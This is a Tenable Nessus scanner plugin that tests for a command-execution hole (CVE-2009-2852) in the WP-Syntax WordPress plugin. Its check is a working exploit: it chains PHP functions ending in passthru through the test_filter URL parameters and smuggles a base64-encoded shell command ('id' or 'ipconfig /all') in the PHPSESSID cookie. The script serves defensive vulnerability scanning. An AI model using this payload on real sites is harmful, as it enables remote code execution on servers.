#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(40592);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2009-2852");
  script_bugtraq_id(36040);
  script_xref(name:"milw0rm", value:"9431");
  script_xref(name:"OSVDB", value:"57204");

  script_name(english:"WP-Syntax apply_filters function Command Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP script that is affected by a\n",
      "command execution vulnerability."
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The installation of WordPress on the remote web server includes the\n",
      "WP-Syntax plugin, a third-party add-on that provides clean syntax\n",
      "highlighting supporting a wide range of programming languages.\n",
      "\n",
      "The version of WP-Syntax installed on the remote host fails to \n",
      "initialize the 'test_filter' array variable in the 'test/index.php'\n",
      "script.  Provided PHP's 'register_globals' setting is enabled, an\n",
      "anonymous remote attacker can leverage this issue to execute arbitrary\n",
      "commands subject the privileges of the web server user id by adding a\n",
      "specially crafted series of filters, which in turn will be executed in\n",
      "the 'apply_filters()' function."
    )
  );
  script_set_attribute(
    attribute:"solution", 
    value:string(
      "Unknown at this time."
    )
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P"
  );
  script_set_attribute(
    attribute:"vuln_publication_date", 
    value:"2009/08/13"
  );
  script_set_attribute(
    attribute:"plugin_publication_date", 
    value:"2009/08/14"
  );
  script_end_attributes();

  script_category(ACT_MIXED_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0, "Web server does not support PHP scripts.");


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) cmd = "ipconfig /all";
  else cmd = "id";
  cmds = make_list(cmd);
}
else cmds = make_list("id", "ipconfig /all");
cmd_pats = make_array();
cmd_pats["id"] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats["ipconfig /all"] = "Subnet Mask";


# Test an install.
install = get_kb_item(string("www/", port, "/wordpress"));
if (isnull(install)) exit(1, "The 'www/"+port+"/wordpress' KB item is missing.");
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Try to exploit the issue.
  i = rand() % 255;
  sep = string(SCRIPT_NAME, "-", unixtime());

  url = string(
    dir, "/wp-content/plugins/wp-syntax/test/index.php?",
    "test_filter[wp_head][", i, "][0]=session_start&",
    "test_filter[wp_head][", i, "][1]=session_id&",
    "test_filter[wp_head][", i, "][2]=base64_decode&",
    "test_filter[wp_head][", i, "][3]=passthru"
  );

  foreach cmd (cmds)
  {
    exploit = string(cmd, ";echo '<< ", sep, "'");
    cookie = base64(str:exploit);
    cookie = cookie - strstr(cookie, "=");
    if (ereg(pattern:"[^a-zA-Z0-9]", string:cookie))
    {
      debug_print("Can't encode exploit into a valid session identifier; skipping.");
      continue;
    }

    req = http_mk_get_req(
      port        : port,
      item        : url, 
      add_headers : make_array("Cookie", "PHPSESSID="+cookie)
    );
    res = http_send_recv_req(port:port, req:req);
    if (isnull(res)) exit(0);

    # Exit if it's not the script we're looking at.
    if ("<title>WP-Syntax Test Page" >!< res[2]) exit(0, "The WP-Syntax plugin is not installed.");

    # There's a problem if we see the expected command output.
    if ('ipconfig' >< cmd) pat = cmd_pats['ipconfig'];
    else pat = cmd_pats['id'];

    if (egrep(pattern:pat, string:res[2]))
    {
      if (report_verbosity > 0)
      {
        req_str = http_mk_buffer_from_req(req:req);
        report = string(
          "\n",
          "Nessus was able to execute the command '", cmd, "' on the remote \n",
          "host using the following request :\n",
          "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
          req_str, "\n",
          crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
        );
        if (report_verbosity > 1)
        {
          if (sep >< res[2])
          {
            output = res[2];
            output = output - strstr(output, string("<< ", sep));
            while ('media="screen" />' >< output)
              output = strstr(output, 'media="screen" />') - 'media="screen" />';
          }
          else output = res[2];

          report = string(
            report,
           "\n",
            "It produced the following output :\n",
            "\n",
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n",
            output,
            crap(data:"-", length:30), " snip ", crap(data:"-", length:30), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
  exit(0, "The remote host is not affected.");
}
